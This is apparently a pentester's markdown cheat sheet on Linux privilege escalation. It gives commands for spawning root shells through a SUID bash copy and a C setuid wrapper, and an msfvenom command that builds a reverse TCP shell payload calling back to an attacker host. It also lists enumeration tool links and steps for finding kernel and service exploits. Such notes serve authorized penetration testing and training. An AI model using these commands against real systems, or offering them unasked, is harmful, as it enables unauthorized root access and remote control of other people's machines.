# Privilege escalation

## Spawning root shell

### Rootbash

Create copy of `/bin/bash` as `/bin/rootbash` , then run `/bin/rootbash -p`

### Executable

Create bash wrapper in c

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Then, compile it as a root

```text
gcc -o <out_file> <source_code>
```

### Msfvenom executable

Create msfvenom payload, then execute as root.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

### Native reverse shells

```text
https://github.com/mthbernardes/rsg
```

## Enumeration tools

```text
https://github.com/diego-treitos/linux-smart-enumeration
https://github.com/rebootuser/LinEnum
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
https://github.com/sleventyeleven/linuxprivchecker
https://github.com/AlessandroZ/BeRoot
http://pentestmonkey.net/tools/audit/unix-privesc-check
```

## Techniques

### Kernel exploits

Get kernel version

```text
uname -a 
cat /etc/issue
```

Find an exploit for that particular kernel version

```text
searchsploit linux kernel <version> priv esc
./linux-exploit-suggester-2.pl -k <version>
```

### Service exploits

Find services running as root

```text
ps aux | grep "^root"
netstat -nl
```

Check their versions

```text
<service> -v
<service> --version
dpkg -l | grep <service>
rpm -qa | grep <service>
```

